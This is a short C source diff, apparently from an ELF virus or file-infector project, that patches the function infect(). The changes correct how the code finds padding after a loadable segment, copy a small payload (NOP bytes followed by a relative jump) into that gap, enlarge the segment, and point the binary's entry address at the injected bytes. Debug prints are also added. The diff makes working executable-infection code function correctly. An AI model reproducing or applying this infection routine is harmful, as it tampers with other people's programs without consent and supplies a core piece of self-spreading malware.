@@ -6,8 +6,8 @@
 
 #define RET_PATTERN 0xfffffffc
 
-#define REQ_SIZE	0x4
-#define PAY			("\x90\x90\x90\x90")
+#define REQ_SIZE	0x9
+#define PAY			("\x90\x90\x90\x90\xe9\xf7\xfc\xff\xff")
 
 #define DEBUG 	1
 
@@ -1444,17 +1444,29 @@ int infect(const char* fpath)
 	Elf64_Off padding;
 	//Elf64_Xword padsize;
 
-	padding = pHeader[textseg]->p_offset + pHeader[textseg]->p_filesz;
-	if( REQ_SIZE > pHeader[textseg + 1]->p_offset - padding) {
+	padding = pHeader[textseg - 1]->p_offset + pHeader[textseg - 1]->p_filesz;
+	if( REQ_SIZE > pHeader[textseg]->p_offset - padding) {
 		close(victim_fd);
 		return -1;
+	}
+	if(DEBUG) {
+		write(1, "text : seg[", my_strlen("text : seg["));
+		char tmp_index[8];
+		itoa(textseg, tmp_index, 10);
+		write(1, tmp_index, my_strlen(tmp_index));
+		write(1, "]\n", 2);
+		write(1,"found padding : ", my_strlen("found padding : "));
+		char tmp_padding[128];
+		itoa(padding, tmp_padding, 16);
+		write(1, tmp_padding, my_strlen(tmp_padding));
+		write(1, "\n", 1);
 	}
 
 	my_memmove(victim + padding, PAY, REQ_SIZE);
 
-	pHeader[textseg]->p_filesz += REQ_SIZE;
-	pHeader[textseg]->p_memsz += REQ_SIZE;
-	header->e_entry = (unsigned long)(victim + padding);
+	pHeader[textseg - 1]->p_filesz += REQ_SIZE;
+	pHeader[textseg - 1]->p_memsz += REQ_SIZE;
+	header->e_entry = (unsigned long)(pHeader[textseg - 1]->p_vaddr + padding);
 
 
 
